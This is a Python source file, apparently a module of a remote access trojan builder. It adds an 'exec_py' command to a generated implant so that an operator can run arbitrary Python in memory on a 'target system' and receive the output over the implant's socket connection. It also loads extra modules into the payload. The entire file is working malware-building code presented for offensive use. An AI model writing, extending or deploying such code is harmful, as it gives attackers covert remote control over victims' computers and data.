# API
# done


def main(self, option, extra_input=None):
    if option == 'generate':
        self.config.import_statements.append('import sys')
        self.config.import_statements.append('from io import StringIO')
        conditions = extra_input
        if 'execute_python_modules' in conditions.keys():
            list_of_modules = conditions['execute_python_modules']
            for module_to_load in list_of_modules:
                try:
                    if module_to_load != "":
                        exec('import ' + module_to_load)
                        self.log.pos(f"Valid module: {module_to_load}, loaded on")
                        self.config.import_statements.append('import ' + module_to_load)
                except (ImportError, SyntaxError):
                    self.log.war(f"Invalid module: {module_to_load}, not loaded on")
        self.config.functions.append('''
def exec_py(command):
    command = command.split(' ', 1)[1]
    old_stdout = sys.stdout
    result = StringIO()
    sys.stdout = result
    try:
        exec(command)
    except Exception as e:
        result.write(str(e) + '\\n')
    sys.stdout = old_stdout
    result_string = result.getvalue()
    send_all(s,'[*]Result of code : \\n\\n' + result_string)
''')
        self.config.logics.append('''
            elif command == "exec_py":
                exec_py(data)''')
        self.config.help_menu['exec_py <python command>'] = 'Execute in-memory arbitrary python code on the target system'
        self.config.help_menu[
            'exec_py_script'] = 'Script in the terminal a block of in-memory arbitrary python code to execute on the target system'
        self.config.help_menu[
            'exec_py_file <Local file path>'] = 'Execute arbitrary python code from a file to execute on the target system in-memory'
    elif option == 'info':
        self.log.blank('\nName             : Execute python component' \
                       '\nOS               : Linux' \
                       '\nRequired Modules : io, sys, <any module you can load in>' \
                       '\nCommands         : exec_py <python command>' \
                       '\nDescription      : Execute in-memory arbitrary python code on the target system (remote interpreter that does not require python to be installed!)\n')
        return {
                "Name": "Execute python component",
                "OS": "Linux",
                "Required Modules": "io, sys, <any module you can load in>",
                "Commands": "exec_py <python command>",
                "Description": "Execute in-memory arbitrary python code on the target system (remote interpreter that does not require python to be installed!)"
            }